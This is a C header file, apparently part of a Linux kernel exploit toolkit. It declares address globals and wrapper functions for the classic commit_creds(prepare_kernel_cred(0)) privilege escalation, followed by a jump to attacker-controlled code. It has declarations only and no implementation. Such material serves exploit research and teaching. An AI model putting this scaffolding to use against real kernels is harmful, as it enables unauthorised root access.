#ifndef KCRED_H
#define KCRED_H

#include <stdint.h>
#include <stddef.h>


/* ============= Commit Creds  =============

 * Privesc from kernel creds:
 *      commit_creds(prepare_kernel_cred(0));
 */

 /* Globals */
extern uintptr_t COMMIT_CREDS_ADDR;
extern uintptr_t PREPARE_KERNEL_CRED_ADDR;
extern uintptr_t POST_PRIVESC_JUMP_ADDR;
extern uintptr_t KSYMTAB_COMMIT_CREDS_ADDR;  // __ksymtab_commit_creds
extern uintptr_t KSYMTAB_PREPARE_KERNEL_CRED_ADDR;  // __ksymtab_prepare_kernel_cred                                            

/* Commit the creds 0 to become root
 * This returns a task_struct of a privileged context
 *
 * After this, we will need to provide a next jump
 *      to take control of the following move, as root
 */ 

/* Use global variables to avoid clobbers if needed */
void _glb_commit_prepare_cred(void);

/* Pass arguments as a flex */
void __commit_prepare_cred(uintptr_t commit_creds_addr,
                    uintptr_t prepare_kernel_cred_addr,
                    uintptr_t post_privesc_jmp_addr);

/* Wrapper */
void commit_prepare_cred(void);


#endif  // KCRED_H
